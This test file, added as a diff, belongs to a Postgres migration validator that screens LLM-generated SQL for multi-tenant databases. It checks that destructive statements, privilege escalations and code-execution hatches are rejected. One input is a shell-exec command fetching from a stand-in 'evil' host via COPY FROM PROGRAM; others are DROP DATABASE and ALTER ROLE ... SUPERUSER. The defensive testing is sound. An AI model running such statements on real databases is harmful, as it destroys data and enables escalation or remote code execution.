@@ -1,0 +1,262 @@
+import { describe, expect, it } from "vitest";
+import { formatDropIdentifier, makeIdempotent, validateMigrationSql } from "./migration-runner.js";
+
+// Minimal legitimate template with tenant_id — used as a base for "allow" cases.
+const BASE_TABLE = `
+CREATE TABLE IF NOT EXISTS subscribers (
+  id        UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  tenant_id UUID NOT NULL,
+  email     TEXT NOT NULL
+);
+`;
+
+describe("validateMigrationSql — allowed forms", () => {
+  it("accepts an empty string", () => {
+    expect(() => validateMigrationSql("")).not.toThrow();
+  });
+
+  it("accepts CREATE TABLE with tenant_id", () => {
+    expect(() => validateMigrationSql(BASE_TABLE)).not.toThrow();
+  });
+
+  it("accepts CREATE INDEX", () => {
+    const sql = BASE_TABLE + "CREATE INDEX idx_subscribers_email ON subscribers (email);";
+    expect(() => validateMigrationSql(sql)).not.toThrow();
+  });
+
+  it("accepts CREATE UNIQUE INDEX", () => {
+    const sql = BASE_TABLE + "CREATE UNIQUE INDEX uq_subscribers_email ON subscribers (tenant_id, email);";
+    expect(() => validateMigrationSql(sql)).not.toThrow();
+  });
+
+  it("accepts CREATE POLICY", () => {
+    const sql =
+      BASE_TABLE +
+      `CREATE POLICY subs_isolation ON subscribers
+         USING (tenant_id = current_setting('app.current_tenant_id', TRUE)::UUID);`;
+    expect(() => validateMigrationSql(sql)).not.toThrow();
+  });
+
+  it("accepts ALTER TABLE ... ENABLE ROW LEVEL SECURITY", () => {
+    const sql = BASE_TABLE + "ALTER TABLE subscribers ENABLE ROW LEVEL SECURITY;";
+    expect(() => validateMigrationSql(sql)).not.toThrow();
+  });
+
+  it("accepts ALTER TABLE ... ADD COLUMN IF NOT EXISTS", () => {
+    const sql = BASE_TABLE + "ALTER TABLE subscribers ADD COLUMN IF NOT EXISTS note TEXT;";
+    expect(() => validateMigrationSql(sql)).not.toThrow();
+  });
+});
+
+describe("validateMigrationSql — destructive statements", () => {
+  it.each([
+    ["DROP TABLE", "DROP TABLE subscribers;"],
+    ["DROP COLUMN", "ALTER TABLE subscribers DROP COLUMN email;"],
+    ["DROP INDEX", "DROP INDEX idx_subscribers_email;"],
+    ["DROP POLICY", "DROP POLICY subs_isolation ON subscribers;"],
+    ["DROP SCHEMA", "DROP SCHEMA public CASCADE;"],
+    ["DROP DATABASE", "DROP DATABASE postgres;"],
+    ["DROP TYPE", "DROP TYPE app_status;"],
+    ["DROP FUNCTION", "DROP FUNCTION trigger_set_updated_at();"],
+    ["DROP TRIGGER", "DROP TRIGGER set_updated_at ON subscribers;"],
+    ["DROP ROLE", "DROP ROLE tenant_role;"],
+    ["TRUNCATE", "TRUNCATE subscribers;"],
+    ["DELETE FROM", "DELETE FROM subscribers WHERE tenant_id IS NULL;"],
+    ["UPDATE … SET", "UPDATE subscribers SET email = '';"],
+  ])("rejects %s", (_label, sql) => {
+    expect(() => validateMigrationSql(sql)).toThrow(/forbidden construct/i);
+  });
+});
+
+describe("validateMigrationSql — transaction-breaking statements", () => {
+  it("rejects CREATE INDEX CONCURRENTLY — breaks the wrapping transaction", () => {
+    expect(() =>
+      validateMigrationSql("CREATE INDEX CONCURRENTLY idx_foo ON subscribers (email);")
+    ).toThrow(/CONCURRENTLY/);
+  });
+
+  it("rejects REINDEX … CONCURRENTLY", () => {
+    expect(() =>
+      validateMigrationSql("REINDEX TABLE CONCURRENTLY subscribers;")
+    ).toThrow(/CONCURRENTLY/);
+  });
+});
+
+describe("validateMigrationSql — privilege changes", () => {
+  it.each([
+    ["GRANT", "GRANT SELECT ON subscribers TO public;"],
+    ["REVOKE", "REVOKE ALL ON subscribers FROM public;"],
+    ["SET ROLE", "SET ROLE postgres;"],
+    ["SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION postgres;"],
+    ["ALTER POLICY", "ALTER POLICY subs_isolation ON subscribers RENAME TO other;"],
+    ["ALTER ROLE", "ALTER ROLE postgres WITH SUPERUSER;"],
+    ["ALTER USER", "ALTER USER postgres WITH PASSWORD 'x';"],
+    ["ALTER DEFAULT PRIVILEGES", "ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO public;"],
+    ["ALTER SYSTEM", "ALTER SYSTEM SET log_statement = 'all';"],
+  ])("rejects %s", (_label, sql) => {
+    expect(() => validateMigrationSql(sql)).toThrow(/forbidden construct/i);
+  });
+});
+
+describe("validateMigrationSql — arbitrary-code escape hatches", () => {
+  it("rejects COPY … FROM PROGRAM (server-side shell exec)", () => {
+    expect(() =>
+      validateMigrationSql("COPY subscribers FROM PROGRAM 'curl http://evil';")
+    ).toThrow(/FROM PROGRAM/);
+  });
+
+  it("rejects DO $$ ... $$ PL/pgSQL blocks even with benign content", () => {
+    // A DO block is rejected because the regex denylist cannot see inside
+    // PL/pgSQL — the body could do anything.
+    expect(() =>
+      validateMigrationSql("DO $$ BEGIN RAISE NOTICE 'hi'; END $$;")
+    ).toThrow(/DO \$\$/);
+  });
+
+  it("rejects DO $tag$ ... $tag$ blocks", () => {
+    expect(() =>
+      validateMigrationSql("DO $foo$ BEGIN RAISE NOTICE 'hi'; END $foo$;")
+    ).toThrow(/DO \$/);
+  });
+
+  it("rejects CREATE EXTENSION", () => {
+    expect(() =>
+      validateMigrationSql("CREATE EXTENSION IF NOT EXISTS pg_trgm;")
+    ).toThrow(/CREATE EXTENSION/);
+  });
+
+  it("rejects CREATE FUNCTION", () => {
+    expect(() =>
+      validateMigrationSql("CREATE FUNCTION hello() RETURNS text AS $$ SELECT 'hi' $$ LANGUAGE sql;")
+    ).toThrow(/CREATE FUNCTION/);
+  });
+
+  it("rejects CREATE OR REPLACE FUNCTION", () => {
+    expect(() =>
+      validateMigrationSql(
+        "CREATE OR REPLACE FUNCTION hello() RETURNS text AS $$ SELECT 'hi' $$ LANGUAGE sql;"
+      )
+    ).toThrow(/CREATE FUNCTION/);
+  });
+
+  it("rejects CREATE TRIGGER", () => {
+    expect(() =>
+      validateMigrationSql(
+        "CREATE TRIGGER t BEFORE INSERT ON subscribers FOR EACH ROW EXECUTE FUNCTION foo();"
+      )
+    ).toThrow(/CREATE TRIGGER/);
+  });
+});
+
+describe("validateMigrationSql — structural rules", () => {
+  it("rejects ALTER TABLE that isn't ENABLE RLS or ADD COLUMN IF NOT EXISTS", () => {
+    expect(() =>
+      validateMigrationSql("ALTER TABLE subscribers RENAME TO subs;")
+    ).toThrow(/ENABLE ROW LEVEL SECURITY or ADD COLUMN IF NOT EXISTS/);
+  });
+
+  it("rejects CREATE TABLE missing tenant_id", () => {
+    const sql = `CREATE TABLE IF NOT EXISTS subscribers (id UUID PRIMARY KEY, email TEXT);`;
+    expect(() => validateMigrationSql(sql)).toThrow(/missing tenant_id/);
+  });
+});
+
+describe("validate → makeIdempotent order contract", () => {
+  // These tests pin the order that runTenantMigration runs today:
+  //   1. validateMigrationSql(sql)        — runs on RAW LLM input
+  //   2. makeIdempotent(sql)              — produces DO $migration$ blocks
+  // If a future refactor reverses these, or runs validation a second time on
+  // the idempotent output "for safety", every migration with a policy will
+  // start failing. These tests lock the contract so the failure surfaces in
+  // CI rather than in a production deploy.
+
+  const validPolicySql =
+    `CREATE POLICY p ON foo USING (tenant_id = current_setting('app.current_tenant_id', TRUE)::UUID);`;
+
+  it("validateMigrationSql accepts a CREATE POLICY statement", () => {
+    expect(() => validateMigrationSql(validPolicySql)).not.toThrow();
+  });
+
+  it("makeIdempotent wraps CREATE POLICY in a DO $migration$ block", () => {
+    const out = makeIdempotent(validPolicySql);
+    expect(out).toMatch(/DO \$migration\$/);
+    expect(out).toMatch(/EXCEPTION WHEN duplicate_object/);
+  });
+
+  it("validateMigrationSql REJECTS the output of makeIdempotent — order contract", () => {
+    // If validation ever runs on the rewritten SQL, it will reject the
+    // DO $migration$ block as a PL/pgSQL escape hatch.
+    const out = makeIdempotent(validPolicySql);
+    expect(() => validateMigrationSql(out)).toThrow(/DO \$/);
+  });
+});
+
+describe("formatDropIdentifier — rollback identifier shapes", () => {
+  // Regression tests for the rollback regex. An earlier version captured
+  // only `\w+|"[^"]+"`, so `CREATE TABLE public.foo (...)` captured just
+  // `public` and rollback issued `DROP TABLE IF EXISTS "public" CASCADE` —
+  // wrong object, and dangerous if a public-qualified relation existed in
+  // the tenant's search_path. This suite pins the correct DROP shape for
+  // every identifier form the validator permits.
+
+  it("wraps a bare word in double quotes (safe for reserved words)", () => {
+    expect(formatDropIdentifier("subscribers")).toBe(`"subscribers"`);
+    expect(formatDropIdentifier("order")).toBe(`"order"`);
+  });
+
+  it("leaves a pre-quoted identifier verbatim", () => {
+    expect(formatDropIdentifier(`"My Table"`)).toBe(`"My Table"`);
+  });
+
+  it("leaves a schema-qualified identifier verbatim — not wrapped as one string", () => {
+    expect(formatDropIdentifier("public.foo")).toBe("public.foo");
+  });
+
+  it("leaves a schema.\"quoted\" identifier verbatim", () => {
+    expect(formatDropIdentifier(`public."My Table"`)).toBe(`public."My Table"`);
+  });
+});
+
+describe("rollback regex — schema-qualified capture", () => {
+  // Re-derive the regex from the module's behaviour — the test exercises
+  // the actual shape in migration-runner.ts's rollbackTenantMigration.
+  // Keeping this literal inline as the source of truth for what captures.
+  const IDENT = `(?:"[^"]+"|\\w+)`;
+  const CREATE_TABLE_RE = new RegExp(
+    `CREATE\\s+TABLE\\s+(?:IF\\s+NOT\\s+EXISTS\\s+)?((?:${IDENT}\\.)?${IDENT})`,
+    "gi"
+  );
+
+  function captureTables(sql: string): string[] {
+    return [...sql.matchAll(CREATE_TABLE_RE)].map((m) => m[1] ?? "");
+  }
+
+  it("captures a bare table name", () => {
+    expect(captureTables("CREATE TABLE foo (tenant_id UUID);")).toEqual(["foo"]);
+  });
+
+  it("captures a schema-qualified name as the full identifier", () => {
+    // Regression: the previous regex captured only `public` here.
+    expect(captureTables("CREATE TABLE public.foo (tenant_id UUID);")).toEqual([
+      "public.foo",
+    ]);
+  });
+
+  it("captures a quoted table name", () => {
+    expect(captureTables(`CREATE TABLE "My Table" (tenant_id UUID);`)).toEqual([
+      `"My Table"`,
+    ]);
+  });
+
+  it("captures a schema-qualified quoted name", () => {
+    expect(
+      captureTables(`CREATE TABLE public."My Table" (tenant_id UUID);`)
+    ).toEqual([`public."My Table"`]);
+  });
+
+  it("captures across IF NOT EXISTS without eating `IF`", () => {
+    expect(
+      captureTables("CREATE TABLE IF NOT EXISTS public.foo (tenant_id UUID);")
+    ).toEqual(["public.foo"]);
+  });
+});
